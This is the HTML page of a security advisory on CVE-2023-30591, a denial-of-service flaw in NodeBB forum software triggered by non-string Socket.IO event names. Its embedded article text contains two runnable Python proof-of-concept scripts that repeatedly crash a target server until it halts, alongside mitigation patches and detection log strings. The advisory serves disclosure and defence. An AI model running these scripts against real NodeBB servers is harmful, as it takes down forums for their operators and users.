<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product NodeBB     Vendor NodeBB   Severity High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently   Affected Versions &lt; v2.8.11 (Commit 82f0efb)   Tested Versions v2.8.9 (Commit fb100ac)   CVE Identifier CVE-2023-30591   CVE Description Denial-of-service in NodeBB &lt;= v2.8.10 allows unauthenticated attackers to trigger a crash, when invoking eventName.startsWith() or eventName.toString(), while processing Socket.">
<meta name="author" content="Ngo Wei Lin (@Creastery)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-30591/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service" />
<meta property="og:description" content="Summary:    Product NodeBB     Vendor NodeBB   Severity High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently   Affected Versions &lt; v2.8.11 (Commit 82f0efb)   Tested Versions v2.8.9 (Commit fb100ac)   CVE Identifier CVE-2023-30591   CVE Description Denial-of-service in NodeBB &lt;= v2.8.10 allows unauthenticated attackers to trigger a crash, when invoking eventName.startsWith() or eventName.toString(), while processing Socket." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-30591/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-09-29T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-09-29T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service"/>
<meta name="twitter:description" content="Summary:    Product NodeBB     Vendor NodeBB   Severity High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently   Affected Versions &lt; v2.8.11 (Commit 82f0efb)   Tested Versions v2.8.9 (Commit fb100ac)   CVE Identifier CVE-2023-30591   CVE Description Denial-of-service in NodeBB &lt;= v2.8.10 allows unauthenticated attackers to trigger a crash, when invoking eventName.startsWith() or eventName.toString(), while processing Socket."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service",
      "item": "https://starlabs.sg/advisories/23/23-30591/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service",
  "name": "(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service",
  "description": "Summary:    Product NodeBB     Vendor NodeBB   Severity High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently   Affected Versions \u0026lt; v2.8.11 (Commit 82f0efb)   Tested Versions v2.8.9 (Commit fb100ac)   CVE Identifier CVE-2023-30591   CVE Description Denial-of-service in NodeBB \u0026lt;= v2.8.10 allows unauthenticated attackers to trigger a crash, when invoking eventName.startsWith() or eventName.toString(), while processing Socket.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product NodeBB     Vendor NodeBB   Severity High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently   Affected Versions v2.8.11 (Commit 82f0efb)   Tested Versions v2.8.9 (Commit fb100ac)   CVE Identifier CVE-2023-30591   CVE Description Denial-of-service in NodeBB eventName.startsWith() or eventName.toString(), while processing Socket.IO messages via crafted Socket.IO messages containing array or object type for the event name respectively.   CWE Classification(s) CWE-241: Improper Handling of Unexpected Data Type   CAPEC Classification(s) CAPEC-153: Input Data Manipulation    CVSS3.1 Scoring System: Base Score: 7.5 (High)\nVector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) None   Integrity (I) None   Availability (A) High    Product Overview: NodeBB is an open-source community forum platform built on Node.js with the addition of either a Redis, MongoDB, or PostgreSQL database. One of the features of the platform is the utilization of Socket.IO for instant interactions and real-time notifications.\nVulnerability Summary: Due to improper parsing and handling of unexpected payloads supplied in Socket.IO messages, an unauthenticated attacker is able to send a malicious Socket.IO message to cause a NodeBB worker instance to crash. Although NodeBB’s cluster manager attempts to spawn a new replacement worker, it is possible to cause the NodeBB cluster manager to terminate after crashing NodeBB workers multiple times within a short span of time.\nThe vulnerability can be exploited by using an array as the Socket.IO event name to trigger a crash when invoking eventName.startsWith(), or by using an object as the Socket.IO event name, and setting the toString property, to trigger a crash when invoking eventName.toString().\nVulnerability Details: NodeBB uses the Socket.IO library for enable bidirectional, event-based communication between clients and the server. Socket.IO typically uses WebSocket for communication, but supports HTTP long-polling as a fallback.\nCrashing NodeBB Workers: The vulnerability can be found in the Socket.IO message handler implemented in /src/socket.io/index.js:\nfunction onConnection(socket) { ... socket.onAny((event, ...args) = { const payload = { data: [event].concat(args) }; const als = require('../als'); als.run({ uid: socket.uid }, onMessage, socket, payload); // [1] \t}); ... } async function onMessage(socket, payload) { ... const eventName = payload.data[0]; // [2] \t... const parts = eventName.toString().split('.'); // [3] \tconst namespace = parts[0]; const methodToCall = parts.reduce((prev, cur) = { // [4] \tif (prev !== null \u0026\u0026 prev[cur] \u0026\u0026 (!prev.hasOwnProperty || prev.hasOwnProperty(cur))) { return prev[cur]; } return null; }, Namespaces); if (!methodToCall || typeof methodToCall !== 'function') { // [5] \t... return callback({ message: `[[error:invalid-event, ${escapedName}]]` }); // [6] \t} if (!eventName.startsWith('admin.') \u0026\u0026 ratelimit.isFlooding(socket)) { // [7] \twinston.warn(`[socket.io] Too many emits! Disconnecting uid : ${socket.uid}. Events : ${socket.previousEvents}`); return socket.disconnect(); } ... } At [1], the onMessage() callback function is invoked with the payload object containing the event name and the args arguments received. Observe that no type validation or coercion is performed on eventName, and the eventName is assumed to be of String type.\nAt [2], the event name (e.g. topics.loadMoreTags) is extracted from the payload object.\nAt [3], the event name is converted to its string representation before splitting it into multiple parts. Subsequently, the Namespaces object is traversed to get a reference of the event handler to be invoked and assigning it to methodToCall at [4].\nAt [5], if methodToCall is not a function, an error will be returned at [6].\nAt [7], eventName.startsWith('admin.') is invoked. However, if eventName is not a String type, then eventName.startsWith('admin.') throws a TypeError as eventName.startsWith is undefined.\nInterestingly, any data type may be used when supplying the event name in the Socket.IO message due to the following reasons:\n Socket.IO uses JSON.parse() to parse the user-supplied event name in the Socket.IO message. However, Socket.IO does not perform any validation on the event name, and assumes that the event name supplied by the user is of String type. Socket objects in Socket.IO effectively extends from Node.js’ EventEmitter class, so most exposed API functions of Socket.IO socket objects rely on the implementation of EventEmitter. The documentation for Node.js’s EventEmitter suggests that event names should either be of String or Symbol type, but no type validation check is performed on the event name. When storing event listeners (e.g. via emitter.on()) or looking up event listeners (e.g. via emitter.emit()), the event name supplied as argument is implicitly casted to String type. However, the original event name supplied as argument is passed to the event listener without type-casting. This results in user-supplied event names, which may be non-string values, within Socket.IO messages to be passed directly to event listeners.  To avoid the early termination at [6] and preventing the condition at [5] from returning true, while still causing a TypeError to be thrown at [7], an array with a single element can be used to supply the event name:\n const eventName = [\"topics.loadMoreTags\"];  [\"topics.loadMoreTags\"].toString() \"topics.loadMoreTags\"  const parts = eventName.toString().split('.'); // [3] [\"topics\", \"loadMoreTags\"]  eventName.startsWith // at [7] undefined Similarly, it is also possible to cause an uncaught exception earlier when invoking eventName.toString() at [3] by supplying an object with the toString property defined:\n const eventName = {\"toString\": 1};  eventName.toString() // TypeError Crashing NodeBB Cluster Manager: In /loader.js, the cluster manager attempts to restart the workers which exited abnormally:\nLoader.addWorkerEvents = function (worker) { worker.on('exit', (code, signal) = { if (code !== 0) { if (Loader.timesStarted  numProcs * 3) { Loader.timesStarted += 1; if (Loader.crashTimer) { clearTimeout(Loader.crashTimer); } Loader.crashTimer = setTimeout(() = { Loader.timesStarted = 0; }, 10000); } else { console.log(`${numProcs * 3}restarts in 10 seconds, most likely an error on startup. Halting.`); process.exit(); // [8] \t} } console.log(`[cluster] Child Process (${worker.pid}) has exited (code: ${code}, signal: ${signal})`); if (!(worker.suicide || code === 0)) { console.log('[cluster] Spinning up another process...'); forkWorker(worker.index, worker.isPrimary); } }); ... } Finally, at [8], if too many workers exited abnormally within the hard-coded 10 seconds threshold, the cluster manager concludes that a startup error had occurred and will terminate itself as well, killing all NodeBB workers.\nSince an attacker can cause NodeBB workers to exit abruptly at will, this enables the attacker to terminate NodeBB completely, causing persistent denial-of-service.\nExploit Conditions: No additional constraints were identified. An unauthenticated attacker is expected to be able to execute this exploit scenario reliably.\nReproduction Steps: Proof-of-Concept #1: DoS via Array Type for Socket.IO Event Name  Install Socket.IO client for Python using: pip install \"python-socketio[client]\". Save the following proof-of-concept exploit script as dos-via-array.py: #!/usr/bin/env python3 import socketio import sys from time import sleep delay = 0.5 # in seconds def dos(target): sio = socketio.Client() sio.connect(f'{target}/socket.io') sio.emit([\"topics.loadMoreTags\"], {}) # reference any valid event handler within Namespaces def main(target): while True: try: dos(target) except KeyboardInterrupt: sys.exit(0) except: pass sleep(delay) if __name__ == '__main__': target = 'http://localhost:4567' if len(sys.argv)  1 else sys.argv[1] main(target)  Ensure that NodeBB is started using ./nodebb start. Run the exploit script using python3 dos-via-array.py http://:. Observe that after a few seconds, NodeBB terminates with the following message observed in the output logs: 3 restarts in 10 seconds, most likely an error on startup. Halting.   Proof-of-Concept #2: DoS via Object Type for Socket.IO Event Name  Install Socket.IO client for Python using: pip install \"python-socketio[client]\" Save the following proof-of-concept exploit script as dos-via-object.py: #!/usr/bin/env python3 import socketio import sys from time import sleep delay = 0.5 # in seconds def dos(target): sio = socketio.Client() sio.connect(f'{target}/socket.io') sio.emit({\"toString\":0}, {}) # any object setting toString property def main(target): while True: try: dos(target) except KeyboardInterrupt: sys.exit(0) except: pass sleep(delay) if __name__ == '__main__': target = 'http://localhost:4567' if len(sys.argv)  1 else sys.argv[1] main(target)  Ensure that NodeBB is started using ./nodebb start. Run the exploit script using python3 dos-via-object.py http://:. Observe that after a few seconds, NodeBB terminates with the following message observed in the output logs: 3 restarts in 10 seconds, most likely an error on startup. Halting.   Suggested Mitigations: Implement a validation check to ensure that eventName is of String type before processing the message received. For example:\nasync function onMessage(socket, payload) { ... + if (typeof payload.data[0] !== \"string\") { + winston.warn('[socket.io] Non-string event name'); + return socket.disconnect(); + }  const eventName = payload.data[0]; ... } It is also recommended to implement additional error handling to further prevent uncaught exceptions from crashing the NodeBB worker. For example:\nfunction onConnection(socket) { ... socket.onAny((event, ...args) = { const payload = { data: [event].concat(args) }; const als = require('../als'); - als.run({ uid: socket.uid }, onMessage, socket, payload); + try { + als.run({ uid: socket.uid }, onMessage, socket, payload); + } catch (err) { + winston.error(`${event}\\n${err.stack ? err.stack : err.message}`); + socket.disconnect(); + }  }); ... } Detection Guidance: It is possible to search for the following error messages in NodeBB’s standard output/error and their respective log files to identify exploitation attempts of this vulnerability:\nerror: uncaughtException: eventName.toString is not a function error: TypeError: eventName.toString is not a function error: uncaughtException: eventName.startsWith is not a function error: TypeError: eventName.startsWith is not a function 3 restarts in 10 seconds, most likely an error on startup. Halting. Credits: Ngo Wei Lin (@Creastery) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline:  2023-03-27 Vendor Disclosure 2023-03-27 Initial Vendor Contact 2023-03-28 Vendor Patch Release (v2.8.10) containing partial fix 2023-04-11 Vendor Patch Release (v2.8.11) completely fixing vulnerability 2023-09-29 Public Release  ",
  "wordCount" : "1534",
  "inLanguage": "en",
  "datePublished": "2023-09-29T00:00:00Z",
  "dateModified": "2023-09-29T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Ngo Wei Lin (@Creastery)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-30591/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service
    </h1>
    <div class="post-meta"><span title='2023-09-29 00:00:00 +0000 UTC'>September 29, 2023</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Ngo Wei Lin (@Creastery)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#product-overview" aria-label="Product Overview:">Product Overview:</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary:">Vulnerability Summary:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a><ul>
                        
                <li>
                    <a href="#crashing-nodebb-workers" aria-label="Crashing NodeBB Workers:">Crashing NodeBB Workers:</a></li>
                <li>
                    <a href="#crashing-nodebb-cluster-manager" aria-label="Crashing NodeBB Cluster Manager:">Crashing NodeBB Cluster Manager:</a></li></ul>
                </li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#reproduction-steps" aria-label="Reproduction Steps:">Reproduction Steps:</a><ul>
                        
                <li>
                    <a href="#proof-of-concept-1-dos-via-array-type-for-socketio-event-name" aria-label="Proof-of-Concept #1: DoS via Array Type for Socket.IO Event Name">Proof-of-Concept #1: DoS via Array Type for Socket.IO Event Name</a></li>
                <li>
                    <a href="#proof-of-concept-2-dos-via-object-type-for-socketio-event-name" aria-label="Proof-of-Concept #2: DoS via Object Type for Socket.IO Event Name">Proof-of-Concept #2: DoS via Object Type for Socket.IO Event Name</a></li></ul>
                </li>
                <li>
                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations:">Suggested Mitigations:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
                <li>
                    <a href="#credits" aria-label="Credits:">Credits:</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>NodeBB</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>NodeBB</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High - Unprivileged attackers are able to cause NodeBB to crash and exit permanently</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>&lt; <a href="https://github.com/NodeBB/NodeBB/tree/v2.8.11">v2.8.11</a> (Commit <a href="https://github.com/NodeBB/NodeBB/commit/82f0efb14b466998edb52fd8f10582508e958173">82f0efb</a>)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td><a href="https://github.com/NodeBB/NodeBB/tree/v2.8.9">v2.8.9</a> (Commit <a href="https://github.com/NodeBB/NodeBB/commit/fb100ac73128aa6b06efa9fd6738466fc674aa1b">fb100ac</a>)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-30591</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Denial-of-service in NodeBB &lt;= v2.8.10 allows unauthenticated attackers to trigger a crash, when invoking <code>eventName.startsWith()</code> or <code>eventName.toString()</code>, while processing Socket.IO messages via crafted Socket.IO messages containing array or object type for the event name respectively.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-241: Improper Handling of Unexpected Data Type</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-153: Input Data Manipulation</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 7.5 (High)<br>
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="product-overview">Product Overview:<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
<p>NodeBB is an open-source community forum platform built on Node.js with the addition of either a Redis, MongoDB, or PostgreSQL database. One of the features of the platform is the utilization of <a href="https://socket.io">Socket.IO</a> for instant interactions and real-time notifications.</p>
<h2 id="vulnerability-summary">Vulnerability Summary:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
<p>Due to improper parsing and handling of unexpected payloads supplied in Socket.IO messages, an unauthenticated attacker is able to send a malicious Socket.IO message to cause a NodeBB worker instance to crash. Although NodeBB&rsquo;s cluster manager attempts to spawn a new replacement worker, it is possible to cause the NodeBB cluster manager to terminate after crashing NodeBB workers multiple times within a short span of time.</p>
<p>The vulnerability can be exploited by using an array as the Socket.IO event name to trigger a crash when invoking <code>eventName.startsWith()</code>, or by using an object as the Socket.IO event name, and setting the <code>toString</code> property, to trigger a crash when invoking <code>eventName.toString()</code>.</p>
<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>NodeBB uses the <a href="https://socket.io/">Socket.IO</a> library for enable bidirectional, event-based communication between clients and the server. Socket.IO typically uses WebSocket for communication, but supports HTTP long-polling as a fallback.</p>
<h3 id="crashing-nodebb-workers">Crashing NodeBB Workers:<a hidden class="anchor" aria-hidden="true" href="#crashing-nodebb-workers">#</a></h3>
<p>The vulnerability can be found in the Socket.IO message handler implemented in <a href="https://github.com/NodeBB/NodeBB/blob/v2.8.9/src/socket.io/index.js"><code>/src/socket.io/index.js</code></a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onConnection</span><span class="p">(</span><span class="nx">socket</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="nx">socket</span><span class="p">.</span><span class="nx">onAny</span><span class="p">((</span><span class="nx">event</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">data</span><span class="o">:</span> <span class="p">[</span><span class="nx">event</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">		<span class="kr">const</span> <span class="nx">als</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../als&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">als</span><span class="p">.</span><span class="nx">run</span><span class="p">({</span> <span class="nx">uid</span><span class="o">:</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">uid</span> <span class="p">},</span> <span class="nx">onMessage</span><span class="p">,</span> <span class="nx">socket</span><span class="p">,</span> <span class="nx">payload</span><span class="p">);</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">onMessage</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span> <span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="kr">const</span> <span class="nx">eventName</span> <span class="o">=</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="kr">const</span> <span class="nx">parts</span> <span class="o">=</span> <span class="nx">eventName</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kr">const</span> <span class="nx">namespace</span> <span class="o">=</span> <span class="nx">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="kr">const</span> <span class="nx">methodToCall</span> <span class="o">=</span> <span class="nx">parts</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">prev</span><span class="p">,</span> <span class="nx">cur</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span> <span class="c1">// [4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="nx">prev</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">prev</span><span class="p">[</span><span class="nx">cur</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="nx">prev</span><span class="p">.</span><span class="nx">hasOwnProperty</span> <span class="o">||</span> <span class="nx">prev</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">cur</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">prev</span><span class="p">[</span><span class="nx">cur</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">},</span> <span class="nx">Namespaces</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">methodToCall</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">methodToCall</span> <span class="o">!==</span> <span class="s1">&#39;function&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [5]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">...</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">callback</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="sb">`[[error:invalid-event, </span><span class="si">${</span><span class="nx">escapedName</span><span class="si">}</span><span class="sb">]]`</span> <span class="p">});</span> <span class="c1">// [6]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">eventName</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;admin.&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ratelimit</span><span class="p">.</span><span class="nx">isFlooding</span><span class="p">(</span><span class="nx">socket</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [7]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">winston</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`[socket.io] Too many emits! Disconnecting uid : </span><span class="si">${</span><span class="nx">socket</span><span class="p">.</span><span class="nx">uid</span><span class="si">}</span><span class="sb">. Events : </span><span class="si">${</span><span class="nx">socket</span><span class="p">.</span><span class="nx">previousEvents</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At [1], the <code>onMessage()</code> callback function is invoked with the <code>payload</code> object containing the <code>event</code> name and the <code>args</code> arguments received. Observe that no type validation or coercion is performed on <code>eventName</code>, and the <code>eventName</code> is assumed to be of <code>String</code> type.</p>
<p>At [2], the event name (e.g. <code>topics.loadMoreTags</code>) is extracted from the <code>payload</code> object.</p>
<p>At [3], the event name is converted to its string representation before splitting it into multiple parts. Subsequently, the <code>Namespaces</code> object is traversed to get a reference of the event handler to be invoked and assigning it to <code>methodToCall</code> at [4].</p>
<p>At [5], if <code>methodToCall</code> is not a function, an error will be returned at [6].</p>
<p>At [7], <code>eventName.startsWith('admin.')</code> is invoked. However, if <code>eventName</code> is not a <code>String</code> type, then <code>eventName.startsWith('admin.')</code> throws a <code>TypeError</code> as <code>eventName.startsWith</code> is <code>undefined</code>.</p>
<p>Interestingly, any data type may be used when supplying the event name in the Socket.IO message due to the following reasons:</p>
<ul>
<li>Socket.IO uses <code>JSON.parse()</code> to parse the user-supplied event name in the Socket.IO message. However, Socket.IO does not perform any validation on the event name, and assumes that the event name supplied by the user is of <code>String</code> type.</li>
<li><code>Socket</code> objects in Socket.IO effectively extends from Node.js&rsquo; <code>EventEmitter</code> class, so most exposed API functions of Socket.IO socket objects rely on the implementation of <code>EventEmitter</code>.</li>
<li>The documentation for Node.js&rsquo;s <code>EventEmitter</code> suggests that event names should either be of <code>String</code> or <code>Symbol</code> type, but no type validation check is performed on the event name.</li>
